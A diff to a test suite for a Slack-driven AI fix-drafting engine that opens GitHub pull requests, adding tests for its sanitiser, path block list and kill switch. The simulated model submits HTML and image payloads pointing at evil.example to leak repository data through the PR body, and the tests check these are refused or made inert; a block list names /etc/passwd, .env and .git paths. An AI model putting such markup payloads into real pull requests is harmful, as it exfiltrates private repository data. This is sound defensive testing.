@@ -21,7 +21,7 @@ import { SlackOutbox, type SlackMessage, type Transport } from '../src/output/sl
 import { Issues } from '../src/patrol/issues.js';
 import { ACTION, controlsFor, FIX_ACTION, onClick, type ButtonIds } from '../src/slack/buttons.js';
 import { startButtons, type SocketClient } from '../src/slack/socket.js';
-import { Fixer } from '../src/fix/draft.js';
+import { Fixer, prBody } from '../src/fix/draft.js';
 import { FixGitHub, pushFixBranch } from '../src/fix/github.js';
 import { FIX_REPOS, FixMap } from '../src/fix/repos.js';
 import { fixPath, writeInto } from '../src/fix/tools.js';
@@ -40,6 +40,12 @@ const MONITOR_RUN = '20261103T080000Z-monitor-abc123';
 const TITLE = 'Sign-in rejects emails with a trailing space';
 const HYPOTHESIS = 'email validation rejects a trailing space';
 const BUG = 'return email.toLowerCase();';
+// A file name that ends the PR body's code span and paragraph, then loads an image whose URL is an entity.
+const EVIL_PATH = 'a.ts\n\n<img src="&#104;ttps://evil.example/?d=repo-data">';
+// Text outside a code span: only a tag that can't form is safe (no newline, no backtick needed).
+const HTML_NOTE = 'See <picture><source srcset="&#104;ttps://evil.example/?d=repo-data"></picture> too.';
+// Markup the body may hold: none outside a code span.
+const tagsOutsideCode = (md: string) => md.replace(/`[^`\n]*`/g, '').match(/<[a-z/!][^\n]*/gi) ?? [];
 
 // ---- GitHub: a local bare repo for git, and a fake REST API ------------------------
 
@@ -174,12 +180,14 @@ function fixModel(seen: Seen, o: { stopAfter?: string } = {}): Script {
       assert.equal(r.isError, false, r.text);
     }
     seen.readBack = readFileSync(path, 'utf8'); // what Read and Grep now see
+    const evil = await sim.mcp('write_file', { path: EVIL_PATH, content: 'x' });
+    assert.equal(evil.isError, true, 'a file name that would break the PR body is refused');
     const r = await sim.mcp('submit_fix', {
       summary: 'Trim the email before lowercasing it, so a trailing space no longer fails sign-in. ![x](https://evil.example/leak.png)',
       cause: 'normalizeEmail lowercases but never trims, and the validator rejects the space.',
       evidence: [{ id, quote: BUG }],
       test: 'test/login-trim.test.ts checks a trailing space is trimmed; run npm test.',
-      notes: ['Other callers of normalizeEmail were not checked; ask @devs to look.'],
+      notes: ['Other callers of normalizeEmail were not checked; ask @devs to look.', HTML_NOTE],
     });
     assert.equal(r.isError, false, r.text);
     if (o.stopAfter) {
@@ -192,7 +200,7 @@ function fixModel(seen: Seen, o: { stopAfter?: string } = {}): Script {
 
 // ---- the world: one issue posted with its buttons, and the fixer -------------------
 
-function setup(o: { model?: Script; engine?: Partial<Engine>; github?: Omit<Parameters<typeof api>[0], 'bare'>; fix?: boolean; spent?: number } = {}) {
+function setup(o: { model?: Script; engine?: Partial<Engine>; github?: Omit<Parameters<typeof api>[0], 'bare'>; fix?: boolean; spent?: number; onGit?: (args: string[]) => void } = {}) {
   const c = testConfig();
   const db = join(c.runsDir, 'engine.db');
   const clock = { now: at(0) };
@@ -218,6 +226,7 @@ function setup(o: { model?: Script; engine?: Partial<Engine>; github?: Omit<Para
   const gits: string[][] = [];
   const recordGit: Git = (args, opts) => {
     gits.push(args);
+    o.onGit?.(args);
     return realGit(args, opts);
   };
   const fixer = new Fixer({
@@ -298,6 +307,8 @@ test('Draft a fix: recorded before the ack, then the engine pushes agent-engine/
     assert.ok(body.includes(part), `the body has ${part}`);
   assert.ok(!body.includes('@devs') && body.includes('@​devs'), 'no @-mention that would notify anyone');
   assert.ok(!body.includes('evil.example/leak.png'), 'no image');
+  assert.deepEqual(tagsOutsideCode(body), [], 'no HTML from the model');
+  assert.ok(body.includes('See &lt;picture&gt;&lt;source srcset="&#104;ttps://evil.example/?d=repo-data"&gt;&lt;/picture&gt; too.'), 'shown as text');
 
   // Recorded, and its link once in the thread, not in the channel.
   const url = 'https://github.com/starkfuture/backend/pull/101';
@@ -424,9 +435,10 @@ test('the repo map: real service names to their repos; the repo most rows map to
 test('the edit tools write only plain repo files: no escapes, git internals, workflows or secrets, and never through a symlink', () => {
   const root = tmp('snap-');
   mkdirSync(join(root, 'src'));
-  for (const p of ['../x.ts', '/etc/passwd', '~/x', '.git/config', 'sub/.GIT/hooks/pre-commit', '.env', 'config/prod.pem', '.github/workflows/ci.yml', 'a\\b.ts', ''])
+  for (const p of ['../x.ts', '/etc/passwd', '~/x', '.git/config', 'sub/.GIT/hooks/pre-commit', '.env', 'config/prod.pem', '.github/workflows/ci.yml', 'a\\b.ts', '', EVIL_PATH, 'a b.ts', 'a`b`.ts', 'a&b.ts', 'a<b>.ts', 'bell\u0007.ts', 'tab\t.ts'])
     assert.ok('error' in fixPath(root, p), p);
   assert.deepEqual(fixPath(root, 'src/a.ts'), { rel: 'src/a.ts' });
+  assert.deepEqual(fixPath(root, 'app/[locale]/(shop)/@modal/page.test.tsx'), { rel: 'app/[locale]/(shop)/@modal/page.test.tsx' }, 'Next.js route folders');
   assert.deepEqual(fixPath(root, './src/a.ts'), { rel: 'src/a.ts' });
   assert.deepEqual(fixPath(root, join(root, 'src', 'a.ts')), { rel: 'src/a.ts' });
   const outside = tmp('outside-');
@@ -437,6 +449,20 @@ test('the edit tools write only plain repo files: no escapes, git internals, wor
   assert.deepEqual(readdirSync(outside), [], 'nothing written outside');
   writeInto(root, 'src/new/b.ts', 'ok');
   assert.equal(readFileSync(join(root, 'src', 'new', 'b.ts'), 'utf8'), 'ok');
+});
+
+test('file names in the PR body go through the same sanitiser: one line, in a code span, never HTML', async () => {
+  const w = await flushed(setup());
+  const issue = w.issues.get(w.issue.id)!;
+  const fix = { summary: 'Trim the email.\n\n<img src="&#104;ttps://evil.example/a">', cause: 'It is never trimmed.', evidence: [{ id: 'E-0000-1', quote: BUG }], test: 'npm test', notes: [HTML_NOTE] };
+  const run = { runId: '20261103T081500Z-codebase-abcdef', status: 'ok' as const, outputs: [fix], evidence: undefined as never, cost: 0.4, turns: 6 };
+  const body = prBody({ issue, report, fix, files: ['app/[locale]/(shop)/page.tsx', EVIL_PATH], run, agent: loadAgent(join(w.c.agentsDir, 'codebase')) });
+  assert.equal(body.split('\n').find((l) => l.startsWith('Files: ')), 'Files: `app/[locale]/(shop)/page.tsx`, `a.ts [image removed]`');
+  assert.deepEqual(tagsOutsideCode(body), []);
+  assert.ok(!body.includes('\n\n<') && !body.includes('<img'));
+  const sneaky = prBody({ issue, report, fix, files: ['a.ts\n\n<source srcset="&#104;ttps://evil.example/b">'], run, agent: loadAgent(join(w.c.agentsDir, 'codebase')) });
+  assert.equal(sneaky.split('\n').find((l) => l.startsWith('Files: ')), 'Files: `a.ts <source srcset="&#104;ttps://evil.example/b">`', 'inert: inside one code span');
+  assert.deepEqual(tagsOutsideCode(sneaky), []);
 });
 
 // ---- spend, stops and failures ---------------------------------------------------------
@@ -462,6 +488,33 @@ test('a run stopped by the kill switch pushes nothing, even with a fix submitted
   assert.deepEqual(w.r.branches(), ['main']);
   assert.match(String(fixEvents(w).at(-1)!.data.reason), /^the run was stopped/);
   assert.ok(!w.gh.calls.some((c) => c.method === 'POST' && c.path.endsWith('/pulls')));
+});
+
+test('the kill switch or a stop after the run still stops the push and the PR', async () => {
+  // The kill switch while the engine commits: nothing is pushed.
+  let a!: ReturnType<typeof setup>;
+  a = await flushed(setup({ onGit: (args) => args.includes('commit') && writeFileSync(a.engine.stopFile, 'now\n') }));
+  await a.click(a.issue.id);
+  assert.deepEqual(a.r.branches(), ['main']);
+  assert.ok(!a.gits.some((g) => g.includes('push')), 'no push');
+  assert.equal(fixEvents(a).at(-1)!.data.reason, 'stopped: the kill switch is on');
+  assert.deepEqual(a.replies.slice(1).map((r) => r[1]), [`No fix drafted for ${a.issue.id}: stopped: the kill switch is on. Nothing was pushed.`], 'one reply');
+
+  // The kill switch while it pushes: no pull request.
+  let b!: ReturnType<typeof setup>;
+  b = await flushed(setup({ onGit: (args) => args.includes('push') && writeFileSync(b.engine.stopFile, 'now\n') }));
+  await b.click(b.issue.id);
+  assert.ok(!b.gh.calls.some((c) => c.method === 'POST' && c.path.endsWith('/pulls')), 'no PR');
+  assert.equal(fixEvents(b).at(-1)!.data.reason, 'stopped: the kill switch is on');
+  assert.match(b.replies.at(-1)![1], /^No draft pull request for I-[0-9a-f]+: stopped: the kill switch is on\. The branch agent-engine\/fix-I-[0-9a-f]+ is on GitHub\.$/);
+
+  // The buttons stop (a shutdown) while it commits: nothing is pushed.
+  let c!: ReturnType<typeof setup>;
+  c = await flushed(setup({ onGit: (args) => args.includes('commit') && c.fixer.stop('the engine is shutting down') }));
+  await c.click(c.issue.id);
+  assert.deepEqual(c.r.branches(), ['main']);
+  assert.equal(fixEvents(c).at(-1)!.data.reason, 'stopped: the engine is shutting down');
+  assert.equal(c.issues.fix(c.issue.id), undefined, 'the button works again');
 });
 
 test('a PR already on GitHub for the branch is linked without a run; a branch without one is refused before any spend', async () => {
@@ -547,6 +600,42 @@ test('off unless both GITHUB_FIX_APP_ID and GITHUB_FIX_APP_PRIVATE_KEY are set: 
   on.box.updateRoot(on.issue.id);
   await on.box.flush();
   assert.deepEqual(buttons(on.t.updates.at(-1)!.blocks), []);
+});
+
+test('Socket Mode: a Draft a fix click whose ack Slack refused still starts its work', async () => {
+  const w = await flushed(setup());
+  const id = w.issue.id;
+  const handlers = new Map<string, (a: { body?: unknown; ack?: () => Promise<void> }) => void>();
+  const client: SocketClient = { on: (e, f) => handlers.set(e, f), start: async () => {}, disconnect: async () => {} };
+  const logs: string[] = [];
+  const socket = startButtons({ appToken: 'xapp-1-A0TESTAPP-1-abcdef', appId: IDS.app, channel: IDS.channel, team: async () => IDS.team, issues: w.issues, outbox: w.box, log: (s) => logs.push(s), client: () => client, respond: async () => {}, now: () => w.clock.now, fix: w.fixer });
+  await socket.ready;
+  handlers.get('interactive')!({ body: payload(FIX_ACTION, id), ack: () => Promise.reject(new Error('socket closed')) });
+  const ended = () => fixEvents(w).some((e) => e.type === 'fix_drafted' || e.type === 'fix_failed');
+  for (let i = 0; i < 6000 && !ended(); i++) await new Promise((r) => setTimeout(r, 10));
+  await socket.stop();
+  assert.ok(logs.includes('buttons: Slack did not take the acknowledgement'));
+  assert.equal(w.issues.fix(id)?.kind, 'drafted', 'dispatched anyway: a redelivery would be stale');
+});
+
+test('recovery ends a request that never started, but not one being drafted or just recorded', async () => {
+  const w = await flushed(setup());
+  const id = w.issue.id;
+  const first = onClick(payload(FIX_ACTION, id), w.ctx);
+  const job = first.after!(); // being drafted in this process
+  assert.deepEqual(w.fixer.recover({ olderThanMs: 0 }), [], 'its work is running');
+  await job;
+  assert.equal(w.issues.fix(id)?.kind, 'drafted');
+
+  const other = setup();
+  await other.box.flush();
+  onClick(payload(FIX_ACTION, other.issue.id), other.ctx); // recorded; its dispatch never happens
+  other.clock.now = at(10);
+  assert.deepEqual(other.fixer.recover({ olderThanMs: 15 * 60_000 }), [], 'not yet: dispatch may still come');
+  other.clock.now = at(16);
+  assert.deepEqual(other.fixer.recover({ olderThanMs: 15 * 60_000 }), [other.issue.id]);
+  assert.equal(fixEvents(other).at(-1)!.data.reason, 'it never started');
+  assert.equal(other.issues.fix(other.issue.id), undefined, 'the button works again');
 });
 
 test('after a restart, a fix left half drafted ends and the button is back', async () => {
